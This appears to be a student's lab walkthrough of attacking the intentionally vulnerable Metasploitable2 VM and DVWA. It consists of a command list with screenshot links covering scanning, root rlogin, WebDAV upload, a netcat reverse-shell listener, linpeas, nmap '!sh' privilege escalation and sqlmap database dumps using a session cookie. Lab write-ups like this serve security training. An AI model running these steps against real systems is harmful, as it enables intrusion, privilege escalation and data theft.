# Metalsploitabl2 192.168.7.132
## Andrea Zonnekus 18758119

sudo netdiscover -i eth0

![](metasploitabl2_steps/Aspose.Words.a593a838-a8f3-4b41-9f0e-36a929165382.001.png)

sudo nmap -sV -p- -sC -O 192.168.7.132 -o host

![](metasploitabl2_steps/Aspose.Words.a593a838-a8f3-4b41-9f0e-36a929165382.002.png)

![](metasploitabl2_steps/Aspose.Words.a593a838-a8f3-4b41-9f0e-36a929165382.003.png)

enum4linux -r 192.168.2.155

![](metasploitabl2_steps/Aspose.Words.a593a838-a8f3-4b41-9f0e-36a929165382.004.png)

searchsploit ProFTPD 1.3.1

![](metasploitabl2_steps/Aspose.Words.a593a838-a8f3-4b41-9f0e-36a929165382.005.png)



rlogin -l root 192.168.7.132

![](metasploitabl2_steps/Aspose.Words.a593a838-a8f3-4b41-9f0e-36a929165382.006.png)

davtest --url <http://192.168.7.132/dav/>

![](metasploitabl2_steps/Aspose.Words.a593a838-a8f3-4b41-9f0e-36a929165382.007.png)

cadaver <http://192.168.7.132/dav>

![](metasploitabl2_steps/Aspose.Words.a593a838-a8f3-4b41-9f0e-36a929165382.008.png)

![](metasploitabl2_steps/Aspose.Words.a593a838-a8f3-4b41-9f0e-36a929165382.009.png)



nc -lvnp 1234

![](metasploitabl2_steps/Aspose.Words.a593a838-a8f3-4b41-9f0e-36a929165382.010.png)

uname -a

![](metasploitabl2_steps/Aspose.Words.a593a838-a8f3-4b41-9f0e-36a929165382.011.png)

cat /etc/\*release

![](metasploitabl2_steps/Aspose.Words.a593a838-a8f3-4b41-9f0e-36a929165382.012.png)

python -c 'import pty; pty.spawn("/bin/bash")'

![](metasploitabl2_steps/Aspose.Words.a593a838-a8f3-4b41-9f0e-36a929165382.013.png)

put linpeas.sh

![](metasploitabl2_steps/Aspose.Words.a593a838-a8f3-4b41-9f0e-36a929165382.014.png)

./linpeas.sh

![](metasploitabl2_steps/Aspose.Words.a593a838-a8f3-4b41-9f0e-36a929165382.015.png)

nmap –interactive

!sh

whoami

![](metasploitabl2_steps/Aspose.Words.a593a838-a8f3-4b41-9f0e-36a929165382.016.png)





![](metasploitabl2_steps/Aspose.Words.a593a838-a8f3-4b41-9f0e-36a929165382.017.png)

<http://192.168.56.108/dvwa/vulnerabilities/sqli/?id=1>

![](metasploitabl2_steps/Aspose.Words.a593a838-a8f3-4b41-9f0e-36a929165382.018.png)

PHPSESSID=4157f0462af950f5ddf4543b8cbeceb5

<http://192.168.56.108/dvwa/login.php>

sqlmap -u "http://192.168.56.108/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=4157f0462af950f5ddf4543b8cbeceb5" –dbs

![](metasploitabl2_steps/Aspose.Words.a593a838-a8f3-4b41-9f0e-36a929165382.019.png)

sqlmap -u "http://192.168.56.108/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=4157f0462af950f5ddf4543b8cbeceb5" --tables -D dvwa

![](metasploitabl2_steps/Aspose.Words.a593a838-a8f3-4b41-9f0e-36a929165382.020.png)



sqlmap -u "http://192.168.56.108/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=4157f0462af950f5ddf4543b8cbeceb5" -D dvwa –dump

![](metasploitabl2_steps/Aspose.Words.a593a838-a8f3-4b41-9f0e-36a929165382.021.png)

![](metasploitabl2_steps/Aspose.Words.a593a838-a8f3-4b41-9f0e-36a929165382.022.png)

wapiti-getcookie -c cooke.json -u <http://192.168.56.108/dvwa/login.php>

![](metasploitabl2_steps/Aspose.Words.a593a838-a8f3-4b41-9f0e-36a929165382.023.png)



<http://192.168.56.108/xvwa/>

